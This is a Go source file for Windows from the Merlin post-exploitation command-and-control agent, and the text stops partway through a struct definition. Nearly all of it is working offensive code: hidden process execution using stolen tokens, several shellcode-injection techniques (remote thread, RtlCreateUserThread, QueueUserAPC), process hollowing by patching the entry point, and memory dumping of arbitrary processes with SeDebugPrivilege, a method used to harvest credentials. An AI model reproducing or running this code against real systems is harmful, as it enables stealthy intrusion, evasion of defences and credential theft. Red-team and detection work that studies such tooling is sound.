//go:build windows

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	// Standard
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"syscall"
	"unicode/utf8"
	"unsafe"

	// X Packages
	"golang.org/x/sys/windows"

	// Sub Repositories
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/api/kernel32"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/api/ntdll"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/pkg/pipes"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/pkg/text"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/pkg/tokens"
)

// executeCommand instruct an agent to execute a program on the host operating system
func executeCommand(name string, args []string) (stdout string, stderr string) {
	attr := &syscall.SysProcAttr{
		HideWindow: true,
		Token:      syscall.Token(tokens.Token),
	}
	return executeCommandWithAttributes(name, args, attr)
}

// executeCommandWithAttributes starts the process with the provided system process attributes and returns the output
// https://pkg.go.dev/syscall?GOOS=windows#SysProcAttr
func executeCommandWithAttributes(name string, args []string, attr *syscall.SysProcAttr) (stdout string, stderr string) {
	application, err := exec.LookPath(name)
	if err != nil {
		stderr = fmt.Sprintf("there was an error resolving the absolute path for %s: %s", application, err)
		return
	}

	// #nosec G204 -- Subprocess must be launched with a variable
	cmd := exec.Command(application, args...)
	cmd.SysProcAttr = attr

	out, err := cmd.CombinedOutput()
	if cmd.Process != nil {
		stdout = fmt.Sprintf("Created %s process with an ID of %d\n", application, cmd.Process.Pid)
	}

	// Convert the output to a string
	if utf8.Valid(out) {
		stdout += string(out)
	} else {
		s, e := text.DecodeString(out)
		if e != nil {
			stderr = fmt.Sprintf("%s\n", e)
		} else {
			stdout += s
		}
	}

	if err != nil {
		stderr += err.Error()
	}

	return stdout, stderr
}

// ExecuteShellcodeSelf executes provided shellcode in the current process
func ExecuteShellcodeSelf(shellcode []byte) error {
	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeSelf: there was an error calling Windows API VirtualAlloc: %s", err)
	}

	err = ntdll.RtlCopyMemory(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uint32(len(shellcode)))
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeSelf: %s", err)
	}

	var lpflOldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &lpflOldProtect)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: there was an error calling Windows API VirtualProtect: %s", err)
	}

	// Execute the shellcode
	_, _, err = syscall.SyscallN(addr, 0)
	if err != windows.Errno(0) {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: there was an error executing the shellcode by making a syscall on the start address: %s", err)
	}
	return nil
}

// ExecuteShellcodeRemote executes provided shellcode in the provided target process
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
	// Setup OS environment, if any
	err := Setup()
	if err != nil {
		return err
	}
	defer TearDown()

	desiredAccess := uint32(windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ)
	handle, err := windows.OpenProcess(desiredAccess, false, pid)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: there was an error calling Windows API OpenProcess: %s", err)
	}
	defer windows.CloseHandle(handle)

	addr, err := kernel32.VirtualAllocEx(uintptr(handle), 0, len(shellcode), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: %s", err)
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	var lpNumberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(handle, addr, &shellcode[0], uintptr(len(shellcode)), &lpNumberOfBytesWritten)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: there was an error calling Windows API WriteProcessMemory: %s", err)
	}

	var lpflOldProtect uint32
	err = windows.VirtualProtectEx(handle, addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &lpflOldProtect)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: there was an error calling Windows API VirtualProtectEx: %s", err)
	}

	_, err = kernel32.CreateRemoteThreadEx(uintptr(handle), 0, 0, addr, 0, 0, 0, 0)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRemote: %s", err)
	}
	return nil
}

// ExecuteShellcodeRtlCreateUserThread executes provided shellcode in the provided target process using the Windows RtlCreateUserThread call
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
	// Setup OS environment, if any
	err := Setup()
	if err != nil {
		return err
	}
	defer TearDown()

	desiredAccess := uint32(windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ)
	handle, err := windows.OpenProcess(desiredAccess, false, pid)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: there was an error calling Windows API OpenProcess: %s", err)
	}
	defer windows.CloseHandle(handle)

	addr, err := kernel32.VirtualAllocEx(uintptr(handle), 0, len(shellcode), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: %s", err)
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	var lpNumberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(handle, addr, &shellcode[0], uintptr(len(shellcode)), &lpNumberOfBytesWritten)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: there was an error calling Windows API WriteProcessMemory: %s", err)
	}

	var lpflOldProtect uint32
	err = windows.VirtualProtectEx(handle, addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &lpflOldProtect)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: there was an error calling Windows API VirtualProtectEx: %s", err)
	}

	var tHandle uintptr
	_, err = ntdll.RtlCreateUserThread(uintptr(handle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: %s", err)
	}

	_, err = windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeRtlCreateUserThread: %s", err)
	}

	return nil
}

// ExecuteShellcodeQueueUserAPC executes provided shellcode in the provided target process using the Windows QueueUserAPC API call
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
	// TODO this can be local or remote

	// Setup OS environment, if any
	err := Setup()
	if err != nil {
		return err
	}
	defer TearDown()

	// Consider using NtQuerySystemInformation to replace CreateToolhelp32Snapshot AND to find a thread in a wait state
	// https://stackoverflow.com/questions/22949725/how-to-get-thread-state-e-g-suspended-memory-cpu-usage-start-time-priori

	dwFlags := uint32(windows.TH32CS_SNAPTHREAD | windows.TH32CS_SNAPHEAPLIST | windows.TH32CS_SNAPMODULE | windows.TH32CS_SNAPPROCESS)
	pSnapshot, err := windows.CreateToolhelp32Snapshot(dwFlags, pid)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API CreateToolhelp32Snapshot: %s", err)
	}
	defer windows.CloseHandle(pSnapshot)

	desiredAccess := uint32(windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ)
	handle, err := windows.OpenProcess(desiredAccess, false, pid)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API OpenProcess: %s", err)
	}
	defer windows.CloseHandle(handle)

	addr, err := kernel32.VirtualAllocEx(uintptr(handle), 0, len(shellcode), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: %s", err)
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	var lpNumberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(handle, addr, &shellcode[0], uintptr(len(shellcode)), &lpNumberOfBytesWritten)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API WriteProcessMemory: %s", err)
	}

	var lpflOldProtect uint32
	err = windows.VirtualProtectEx(handle, addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &lpflOldProtect)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API VirtualProtectEx: %s", err)
	}

	threadEntry := windows.ThreadEntry32{
		Size: uint32(unsafe.Sizeof(windows.ThreadEntry32{})),
	}
	err = windows.Thread32First(pSnapshot, &threadEntry)
	if err != nil {
		return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API Thread32First: %s", err)
	}

	i := true
	x := 0
	// Queue an APC for every thread; very unstable and not ideal, need to programmatically find alertable thread
	for i {
		err = windows.Thread32Next(pSnapshot, &threadEntry)
		if err != nil {
			// There are no more files.
			if err == windows.ERROR_NO_MORE_FILES {
				i = false
				break
			}
			return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API Thread32Next: %s", err)
		}
		if threadEntry.OwnerProcessID == pid {
			if x > 0 {
				var hThread windows.Handle
				hThread, err = windows.OpenThread(windows.THREAD_SET_CONTEXT, false, threadEntry.ThreadID)
				if err != nil {
					return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API OpenThread: %s", err)
				}
				//fmt.Printf("Queueing APC for PID: %d, Thread %d\n", pid, threadEntry.ThreadID)
				err = kernel32.QueueUserAPC(addr, uintptr(hThread), 0)
				if err != nil {
					return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: %s", err)
				}
				x++
				err = windows.CloseHandle(hThread)
				if err != nil {
					return fmt.Errorf("commands/exec.ExecuteShellcodeQueueUserAPC: there was an error calling Windows API CloseHandle: %s", err)
				}
			} else {
				x++
			}
		}
	}
	return nil
}

// ExecuteShellcodeCreateProcessWithPipe creates a child process, redirects STDOUT/STDERR to an anonymous pipe, injects/executes shellcode, and retrieves output
// Returns STDOUT and STDERR from process execution. Any encountered errors in this function are also returned in STDERR
func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args string) (stdout string, stderr string, err error) {
	// Base64 decode string into bytes
	shellcode, errDecode := base64.StdEncoding.DecodeString(sc)
	if errDecode != nil {
		return stdout, stderr, fmt.Errorf("there  was an error decoding the Base64 string: %s", errDecode)
	}

	// Load DLLs and Procedures
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	// Setup pipes to retrieve output
	stdInRead, _, stdOutRead, stdOutWrite, stdErrRead, stdErrWrite, err := pipes.CreateAnonymousPipes()
	if err != nil {
		return
	}

	application, err := exec.LookPath(spawnto)
	if err != nil {
		err = fmt.Errorf("there was an error resolving the absolute: %s", err)
		return
	}

	// Convert the program to a LPCWSTR
	lpApplicationName, err := syscall.UTF16PtrFromString(application)
	if err != nil {
		err = fmt.Errorf("there was an error converting the application name \"%s\" to LPCWSTR: %s", application, err)
		return
	}

	// Convert the program to a LPCWSTR
	lpCommandLine, err := syscall.UTF16PtrFromString(args)
	if err != nil {
		err = fmt.Errorf("there was an error converting the application arguments \"%s\" to LPCWSTR: %s", args, err)
		return
	}

	lpProcessInformation := &windows.ProcessInformation{}
	lpStartupInfo := &windows.StartupInfo{
		StdInput:   stdInRead,
		StdOutput:  stdOutWrite,
		StdErr:     stdErrWrite,
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED | windows.STARTF_USESHOWWINDOW,
		ShowWindow: windows.SW_HIDE,
	}

	if tokens.Token != 0 {
		err = windows.CreateProcessAsUser(tokens.Token, lpApplicationName, lpCommandLine, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, lpStartupInfo, lpProcessInformation)
		if err != nil {
			err = fmt.Errorf("there was an error calling windows.CreateProcessAsUser(): %s", err)
			return
		}
		stdout += fmt.Sprintf("Created %s process with an ID of %d\n", application, lpProcessInformation.ProcessId)
	} else {
		errCreateProcess := windows.CreateProcess(lpApplicationName, lpCommandLine, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, lpStartupInfo, lpProcessInformation)
		if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
			return stdout, stderr, fmt.Errorf("error calling CreateProcess:\r\n%s", errCreateProcess)
		}
		stdout += fmt.Sprintf("Created %s process with an ID of %d\n", application, lpProcessInformation.ProcessId)
	}

	// Allocate memory in child process
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(lpProcessInformation.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling VirtualAlloc:\r\n%s", errVirtualAlloc)
	}

	if addr == 0 {
		return stdout, stderr, fmt.Errorf("VirtualAllocEx failed and returned 0")
	}

	// Write shellcode into child process memory
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(lpProcessInformation.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory)
	}

	// Change memory permissions to RX in child process where shellcode was written
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(lpProcessInformation.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx)
	}

	var processInformation PROCESS_BASIC_INFORMATION
	var returnLength uintptr
	ntStatus, _, errNtQueryInformationProcess := NtQueryInformationProcess.Call(uintptr(lpProcessInformation.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)
	if errNtQueryInformationProcess != nil && errNtQueryInformationProcess.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling NtQueryInformationProcess:\r\n\t%s", errNtQueryInformationProcess)
	}
	if ntStatus != 0 {
		if ntStatus == 3221225476 {
			return stdout, stderr, fmt.Errorf("error calling NtQueryInformationProcess: STATUS_INFO_LENGTH_MISMATCH") // 0xc0000004 (3221225476)
		}
		fmt.Println(fmt.Sprintf("[!]NtQueryInformationProcess returned NTSTATUS: %x(%d)", ntStatus, ntStatus))
		return stdout, stderr, fmt.Errorf("error calling NtQueryInformationProcess:\r\n\t%s", syscall.Errno(ntStatus))
	}

	// Read from PEB base address to populate the PEB structure
	// ReadProcessMemory
	/*
		BOOL ReadProcessMemory(
		HANDLE  hProcess,
		LPCVOID lpBaseAddress,
		LPVOID  lpBuffer,
		SIZE_T  nSize,
		SIZE_T  *lpNumberOfBytesRead
		);
	*/

	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")

	var peb PEB
	var readBytes int32

	_, _, errReadProcessMemory := ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
	if errReadProcessMemory != nil && errReadProcessMemory.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory)
	}

	var dosHeader IMAGE_DOS_HEADER
	var readBytes2 int32

	_, _, errReadProcessMemory2 := ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
	if errReadProcessMemory2 != nil && errReadProcessMemory2.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory2)
	}

	// 23117 is the LittleEndian unsigned base10 representation of MZ
	// 0x5a4d is the LittleEndian unsigned base16 representation of MZ
	if dosHeader.Magic != 23117 {
		return stdout, stderr, fmt.Errorf("DOS image header magic string was not MZ: 0x%x", dosHeader.Magic)
	}

	// Read the child process's PE header signature to validate it is a PE
	var Signature uint32
	var readBytes3 int32

	_, _, errReadProcessMemory3 := ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))
	if errReadProcessMemory3 != nil && errReadProcessMemory3.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory3)
	}

	// 17744 is Little Endian Unsigned 32-bit integer in decimal for PE (null terminated)
	// 0x4550 is Little Endian Unsigned 32-bit integer in hex for PE (null terminated)
	if Signature != 17744 {
		return stdout, stderr, fmt.Errorf("PE Signature string was not PE: 0x%x", Signature)
	}

	var peHeader IMAGE_FILE_HEADER
	var readBytes4 int32

	_, _, errReadProcessMemory4 := ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))
	if errReadProcessMemory4 != nil && errReadProcessMemory4.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory4)
	}

	var optHeader64 IMAGE_OPTIONAL_HEADER64
	var optHeader32 IMAGE_OPTIONAL_HEADER32
	var errReadProcessMemory5 error
	var readBytes5 int32

	if peHeader.Machine == 34404 { // 0x8664
		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
	} else if peHeader.Machine == 332 { // 0x14c
		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(lpProcessInformation.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
	} else {
		return stdout, stderr, fmt.Errorf("unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine)
	}

	if errReadProcessMemory5 != nil && errReadProcessMemory5.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory5)
	}

	// Overwrite the value at AddressofEntryPoint field with trampoline to load the shellcode address in RAX/EAX and jump to it
	var ep uintptr
	if peHeader.Machine == 34404 { // 0x8664 x64
		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
	} else if peHeader.Machine == 332 { // 0x14c x86
		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
	} else {
		return stdout, stderr, fmt.Errorf("unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine)
	}

	var epBuffer []byte
	var shellcodeAddressBuffer []byte
	// x86 - 0xb8 = mov eax
	// x64 - 0x48 = rex (declare 64bit); 0xb8 = mov eax
	if peHeader.Machine == 34404 { // 0x8664 x64
		epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else if peHeader.Machine == 332 { // 0x14c x86
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else {
		return stdout, stderr, fmt.Errorf("unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine)
	}

	// 0xff ; 0xe0 = jmp [r|e]ax
	epBuffer = append(epBuffer, byte(0xff))
	epBuffer = append(epBuffer, byte(0xe0))

	_, _, errWriteProcessMemory2 := WriteProcessMemory.Call(uintptr(lpProcessInformation.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))

	if errWriteProcessMemory2 != nil && errWriteProcessMemory2.Error() != "The operation completed successfully." {
		return stdout, stderr, fmt.Errorf("error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory2)
	}

	// Resume the child process
	_, errResumeThread := windows.ResumeThread(lpProcessInformation.Thread)
	if errResumeThread != nil {
		return stdout, stderr, fmt.Errorf("[!]Error calling ResumeThread:\r\n%s", errResumeThread)
	}

	// Close the handle to the child process
	errCloseProcHandle := windows.CloseHandle(lpProcessInformation.Process)
	if errCloseProcHandle != nil {
		return stdout, stderr, fmt.Errorf("error closing the child process handle:\r\n\t%s", errCloseProcHandle)
	}

	// Close the hand to the child process thread
	errCloseThreadHandle := windows.CloseHandle(lpProcessInformation.Thread)
	if errCloseThreadHandle != nil {
		return stdout, stderr, fmt.Errorf("error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle)
	}

	// Close the "write" pipe handles
	err = pipes.ClosePipes(0, 0, 0, stdOutWrite, 0, stdErrWrite)
	if err != nil {
		stderr = err.Error()
		return
	}

	// Read from the pipes
	_, out, stderr, err := pipes.ReadPipes(0, stdOutRead, stdErrRead)
	if err != nil {
		stderr += err.Error()
	}
	stdout += out

	// Close the "read" pipe handles
	err = pipes.ClosePipes(stdInRead, 0, stdOutRead, 0, stdErrRead, 0)
	if err != nil {
		stderr += err.Error()
		return
	}
	return
}

// TODO always close handle during exception handling

// miniDump will attempt to perform use the Windows MiniDumpWriteDump API operation on the provided process, and returns
// the raw bytes of the dumpfile back as an upload to the server.
// Touches disk during the dump process, in the OS default temporary or provided temporary directory
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
	var mini map[string]interface{}
	mini = make(map[string]interface{})
	var err error

	// Make sure a temporary directory exists before executing miniDump functionality
	if tempDir != "" {
		d, errS := os.Stat(tempDir)
		if os.IsNotExist(errS) {
			return mini, fmt.Errorf("the provided directory does not exist: %s", tempDir)
		}
		if d.IsDir() != true {
			return mini, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
		}
	} else {
		tempDir = os.TempDir()
	}

	// Get the process PID or name
	mini["ProcName"], mini["ProcID"], err = getProcess(process, inPid)
	if err != nil {
		return mini, err
	}

	// Setup OS environment, if any
	err = Setup()
	if err != nil {
		return mini, err
	}
	defer TearDown()

	// Get debug privs (required for dumping processes not owned by current user)
	err = sePrivEnable("SeDebugPrivilege")
	if err != nil {
		return mini, err
	}

	// Get a handle to process
	hProc, err := syscall.OpenProcess(0x1F0FFF, false, mini["ProcID"].(uint32)) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
	if err != nil {
		return mini, err
	}

	// Set up the temporary file to write to, automatically remove it once done
	// TODO: Work out how to do this in memory
	f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
	if tempErr != nil {
		return mini, tempErr
	}

	// Remove the file after the function exits, regardless of error nor not
	defer os.Remove(f.Name())

	// Load MiniDumpWriteDump function from DbgHelp.dll
	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
	miniDump := k32.NewProc("MiniDumpWriteDump")

	/*
		BOOL MiniDumpWriteDump(
		  HANDLE                            hProcess,
		  DWORD                             ProcessId,
		  HANDLE                            hFile,
		  MINIDUMP_TYPE                     DumpType,
		  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
		  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
		);
	*/
	// Call Windows MiniDumpWriteDump API
	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(mini["ProcID"].(uint32)), f.Fd(), 3, 0, 0, 0)

	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does

	if r != 0 {
		mini["FileContent"], err = ioutil.ReadFile(f.Name())
		if err != nil {
			f.Close()
			return mini, err
		}
	}
	return mini, nil
}

// getProcess takes in a process name OR a process ID and returns a pointer to the process handle, the process name,
// and the process ID.
func getProcess(name string, pid uint32) (string, uint32, error) {
	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go

	if pid <= 0 && name == "" {
		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
	}

	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if int(snapshotHandle) < 0 || err != nil {
		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
	}
	defer syscall.CloseHandle(snapshotHandle)

	var process syscall.ProcessEntry32
	process.Size = uint32(unsafe.Sizeof(process))
	err = syscall.Process32First(snapshotHandle, &process)
	if err != nil {
		return "", 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
	}

	for {
		processName := syscall.UTF16ToString(process.ExeFile[:])
		if pid > 0 {
			if process.ProcessID == pid {
				return processName, pid, nil
			}
		} else if name != "" {
			if processName == name {
				return name, process.ProcessID, nil
			}
		}
		err = syscall.Process32Next(snapshotHandle, &process)
		if err != nil {
			break
		}
	}
	return "", 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
}

// sePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
func sePrivEnable(s string) error {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	type LUID_AND_ATTRIBUTES struct {
		Luid       LUID
		Attributes uint32
	}
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}

	modadvapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}
	syscall.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	r, _, e := procLookupPriv.Call(
		uintptr(0), //LPCWSTR lpSystemName,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s))), //LPCWSTR lpName,
		uintptr(unsafe.Pointer(&luid)),                       //PLUID   lpLuid
	)
	if r == 0 {
		return e
	}
	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
	privs := TOKEN_PRIVILEGES{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	//AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)
	r, _, e = procAdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		uintptr(0),
		uintptr(unsafe.Pointer(&privs)),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)
	if r == 0 {
		return e
	}
	return nil
}

// PEB is the Process Environment Block structure that contains information about a process
// https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb
// https://github.com/winlabs/gowin32/blob/0b6f3bef0b7501b26caaecab8d52b09813224373/wrappers/winternl.go#L37
// http://bytepointer.com/resources/tebpeb32.htm
// https://www.nirsoft.net/kernel_struct/vista/PEB.html
type PEB struct {
	//reserved1              [2]byte     // BYTE 0-1
	InheritedAddressSpace    byte    // BYTE	0
	ReadImageFileExecOptions byte    // BYTE	1
